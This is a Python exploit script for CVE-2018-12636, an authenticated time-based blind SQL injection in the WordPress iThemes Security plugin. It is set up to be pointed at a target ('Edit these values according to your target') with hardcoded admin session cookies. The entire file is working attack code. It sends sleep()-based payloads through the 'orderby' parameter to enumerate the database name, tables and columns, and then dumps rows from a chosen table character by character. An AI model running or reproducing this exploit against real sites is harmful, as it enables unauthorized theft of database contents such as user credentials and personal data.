import requests


# Exploit for CVE-2018-12636: WordPress Plugin iThemes Security (better-wp-security) <= 7.0.2 - Authenticated SQL
# injection

# Tested on Ubuntu 2020.04.0.1, Python 3.8, WordPress 5.0RC3, iThemes Security 7.0.1


# Edit these values according to your target
URL = 'http://192.168.80.136/wp-admin/admin.php'
COOKIES = {
    'wordpress_2270f044d46307bebcc9aaaba5ed4d99':
        'wordpress%7C1627610868%7CUjQapELvEzd2SLfyvZ2KrqH7bJNVu242WktEua9WOSn'
        '%7Cfb628467c8c06a435cd690d2db9178e12ce01b0ae3e476d2252cd9aca801a45f',
    'wordpress_logged_in_2270f044d46307bebcc9aaaba5ed4d99':
        'wordpress%7C1627610868%7CUjQapELvEzd2SLfyvZ2KrqH7bJNVu242WktEua9WOSn'
        '%7C8d831d9a63984c4f9a6b84f84a726ca9da6f34500bb24760cbf143b48a150a80'
}
DELAY = 1


def create_session():
    return requests.Session()


def find_database_length(session):
    db_name_length = 1
    while db_name_length <= 255:
        condition = f'length(database())={db_name_length}'
        params = {
            'page': 'itsec-logs',
            'filter': 'malware',
            'orderby': f'remote_ip,(SELECT * FROM (SELECT CASE WHEN ({condition}) THEN sleep({DELAY}) ELSE 2 END) AS '
                       f'table_alias)',
            'order': 'asc',
            'paged': '0'
        }
        response = session.get(url=URL, params=params, cookies=COOKIES)
        if response.elapsed.total_seconds() >= DELAY:
            print(f'\t[+] Found length of current database name: {db_name_length}')
            break
        else:
            db_name_length += 1
    return db_name_length


def find_database_name(session, db_name_length):
    db_name = ''
    position = 1
    print(f'\t[+] Found current database name: ', end='')
    while position <= db_name_length:
        for ascii_code in range(33, 126, 1):
            condition = f"ascii(substring(database(), {position}, 1))={ascii_code}"
            params = {
                'page': 'itsec-logs',
                'filter': 'malware',
                'orderby': f'remote_ip,(SELECT * FROM (SELECT CASE WHEN ({condition}) THEN sleep({DELAY}) ELSE 2 END) '
                           f'AS table_alias)',
                'order': 'asc',
                'paged': '0'
            }
            response = session.get(url=URL, params=params, cookies=COOKIES)
            if response.elapsed.total_seconds() >= DELAY:
                print(f'{chr(ascii_code)}', end='')
                db_name += chr(ascii_code)
                position += 1
            else:
                continue
    print('')
    return db_name


def count_tables(session, db_name):
    number_of_tables = 0
    while number_of_tables <= 255:
        condition = f'(SELECT count(table_name) FROM information_schema.tables '\
                    f'WHERE table_schema=database())={number_of_tables}'
        params = {
            'page': 'itsec-logs',
            'filter': 'malware',
            'orderby': f'remote_ip,(SELECT * FROM (SELECT CASE WHEN ({condition}) THEN sleep({DELAY}) ELSE 2 END) AS '
                       f'table_alias)',
            'order': 'asc',
            'paged': '0'
        }
        response = session.get(url=URL, params=params, cookies=COOKIES)
        if response.elapsed.total_seconds() >= DELAY:
            print(f'\t[+] Found {number_of_tables} table(s)')
            break
        else:
            number_of_tables += 1
    return number_of_tables


def find_table_lengths(session, number_of_tables):
    table_lengths = []
    for offset in range(0, number_of_tables):
        length = 0
        while length <= 255:
            condition = f'(SELECT length(table_name) FROM information_schema.tables WHERE table_schema=database() '\
                        f'LIMIT {offset}, 1)={length}'
            params = {
                'page': 'itsec-logs',
                'filter': 'malware',
                'orderby': f'remote_ip,(SELECT * FROM (SELECT CASE WHEN ({condition}) THEN sleep({DELAY}) ELSE 2 END) '
                           f'AS table_alias)',
                'order': 'asc',
                'paged': '0'
            }
            response = session.get(url=URL, params=params, cookies=COOKIES)
            if response.elapsed.total_seconds() >= DELAY:
                print(f'\t[+] Found length of #{offset} table name: {length}')
                table_lengths.append(length)
                break
            else:
                length += 1
    return table_lengths


def find_table_names(session, table_lengths=None):
    if table_lengths is None:
        table_lengths = []
    table_names = []
    for offset in range(0, len(table_lengths)):
        table_name = ''
        position = 1
        while position <= table_lengths[offset]:
            for ascii_code in range(33, 126, 1):
                condition = f'(SELECT ASCII(SUBSTRING(table_name, {position}, 1)) FROM information_schema.tables ' \
                            f'WHERE table_schema=database() LIMIT {offset}, 1)={ascii_code} '
                params = {
                    'page': 'itsec-logs',
                    'filter': 'malware',
                    'orderby': f'remote_ip,(SELECT * FROM (SELECT CASE WHEN ({condition}) THEN sleep({DELAY}) ELSE 2 '
                               f'END) AS table_alias)',
                    'order': 'asc',
                    'paged': '0'
                }
                response = session.get(url=URL, params=params, cookies=COOKIES)
                if response.elapsed.total_seconds() >= DELAY:
                    table_name += chr(ascii_code)
                    break
                else:
                    continue
            position += 1
        print(f'\t[+] Found #{offset} table name: {table_name}')
        table_names.append(table_name)
    return table_names


def count_columns(session, table_name):
    table_name_in_hex = string_2_hex(table_name)
    number = 0
    while number < 255:
        condition = f'(SELECT count(column_name) FROM information_schema.columns WHERE table_schema=DATABASE() AND ' \
                    f'table_name=0x{table_name_in_hex})={number} '
        params = {
            'page': 'itsec-logs',
            'filter': 'malware',
            'orderby': f'remote_ip,(SELECT * FROM (SELECT CASE WHEN ({condition}) THEN sleep({DELAY}) ELSE 2 END) AS '
                       f'table_alias)',
            'order': 'asc',
            'paged': '0'
        }
        response = session.post(url=URL, params=params, cookies=COOKIES)
        if response.elapsed.total_seconds() >= DELAY:
            print(f'\t[+] Found {number} column(s) in {table_name} table')
            break
        else:
            number += 1
    return number


def find_column_lengths(session, table_name, number_of_columns):
    table_name_in_hex = string_2_hex(table_name)
    column_lengths = []
    for offset in range(0, number_of_columns):
        length = 0
        while True:
            condition = f'(SELECT LENGTH(column_name) FROM information_schema.columns WHERE table_schema=DATABASE() ' \
                        f'AND table_name=0x{table_name_in_hex} LIMIT {offset}, 1)={length} '
            params = {
                'page': 'itsec-logs',
                'filter': 'malware',
                'orderby': f'remote_ip,(SELECT * FROM (SELECT CASE WHEN ({condition}) THEN sleep({DELAY}) ELSE 2 END) '
                           f'AS table_alias)',
                'order': 'asc',
                'paged': '0'
            }
            response = session.post(url=URL, params=params, cookies=COOKIES)
            if response.elapsed.total_seconds() >= DELAY:
                print(f'\t[+] Found length of #{offset} column: {length}')
                column_lengths.append(length)
                break
            else:
                length += 1
    return column_lengths


def find_column_names(session, table_name, column_lengths=None):
    table_name_in_hex = string_2_hex(table_name)
    if column_lengths is None:
        column_lengths = []
    column_names = []
    for offset in range(0, len(column_lengths)):
        column_name = ''
        position = 1
        while position <= column_lengths[offset]:
            for ascii_code in range(33, 126):
                condition = f'(SELECT ASCII(SUBSTRING(column_name, {position}, 1)) FROM information_schema.columns ' \
                            f'WHERE table_schema=DATABASE() AND table_name=0x{table_name_in_hex} '\
                            f'LIMIT {offset}, 1)={ascii_code}'
                params = {
                    'page': 'itsec-logs',
                    'filter': 'malware',
                    'orderby': f'remote_ip,(SELECT * FROM (SELECT CASE WHEN ({condition}) THEN sleep({DELAY}) ELSE 2 '
                               f'END) AS table_alias)',
                    'order': 'asc',
                    'paged': '0'
                }
                response = session.post(url=URL, params=params, cookies=COOKIES)
                if response.elapsed.total_seconds() >= DELAY:
                    column_name += chr(ascii_code)
                    break
                else:
                    continue
            position += 1
        print(f'\t[+] Found #{offset} column name: {column_name}')
        column_names.append(column_name)
    return column_names


def count_rows(session, table_name, column_name):
    number_of_rows = 0
    while True:
        condition = f'(SELECT count({column_name.lower()}) FROM {table_name.lower()})={number_of_rows}'
        params = {
            'page': 'itsec-logs',
            'filter': 'malware',
            'orderby': f'remote_ip,(SELECT * FROM (SELECT CASE WHEN ({condition}) THEN SLEEP({DELAY}) ELSE 2 END) AS '
                       f'table_alias)',
            'order': 'asc',
            'paged': '0'
        }
        response = session.post(url=URL, params=params, cookies=COOKIES)
        if response.elapsed.total_seconds() >= DELAY:
            print(f'\t[+] Found {number_of_rows} row(s)')
            break
        else:
            number_of_rows += 1
    return number_of_rows


def find_row_lengths(session, table_name, column_name, number_of_rows):
    row_lengths = []
    for offset in range(0, number_of_rows, 1):
        row_length = 0
        while True:
            condition = f'(SELECT length({column_name.lower()}) FROM {table_name.lower()} '\
                        f'LIMIT {offset}, 1)={row_length}'
            params = {
                'page': 'itsec-logs',
                'filter': 'malware',
                'orderby': f'remote_ip,(SELECT * FROM (SELECT CASE WHEN ({condition}) THEN sleep({DELAY}) ELSE 2 END) '
                           f'AS table_alias)',
                'order': 'asc',
                'paged': '0'
            }
            response = session.post(url=URL, params=params, cookies=COOKIES)
            if response.elapsed.total_seconds() >= DELAY:
                print(f'\t[+] Found length of #{offset} row: {row_length}')
                row_lengths.append(row_length)
                break
            else:
                row_length += 1
    return row_lengths


def find_rows(session, table_name, column_name, row_lengths=None):
    if row_lengths is None:
        row_lengths = []
    rows = []
    for offset in range(0, len(row_lengths), 1):
        row = ''
        position = 1
        while position <= row_lengths[offset]:
            for ascii_code in range(33, 126):
                condition = f'(SELECT ascii(substring({column_name.lower()}, {position}, 1)) '\
                            f'FROM {table_name.lower()} LIMIT {offset}, 1)={ascii_code} '
                params = {
                    'page': 'itsec-logs',
                    'filter': 'malware',
                    'orderby': f'remote_ip,(SELECT * FROM (SELECT CASE WHEN ({condition}) THEN sleep({DELAY}) ELSE 2 '
                               f'END) AS table_alias)',
                    'order': 'asc',
                    'paged': '0'
                }
                response = session.post(url=URL, params=params, cookies=COOKIES)
                if response.elapsed.total_seconds() >= DELAY:
                    row += chr(ascii_code)
                    break
                else:
                    continue
            position += 1
        print(f'\t[+] Found #{offset} row: {row}')
        rows.append(row)
    return rows


def string_2_hex(string_value):
    return string_value.encode('utf-8').hex()


if __name__ == '__main__':
    session = create_session()

    print('[i] Enumerating current database')
    db_name_length = find_database_length(session)
    db_name = find_database_name(session, db_name_length)

    print('[i] Enumerating tables in current database')
    number_of_tables = count_tables(session, db_name)
    table_lengths = find_table_lengths(session, number_of_tables)
    table_names = find_table_names(session, table_lengths)

    table_name = input('Enter name of table in which you want to enumerate columns: ')
    number_of_columns = count_columns(session, table_name)
    column_lengths = find_column_lengths(session, table_name, number_of_columns)
    column_names = find_column_names(session, table_name, column_lengths)

    column_name = input('Enter name of column from which you want to retrieve data: ')
    number_of_rows = count_rows(session, table_name, column_name)
    row_lengths = find_row_lengths(session, table_name, column_name, number_of_rows)
    rows = find_rows(session, table_name, column_name, row_lengths)
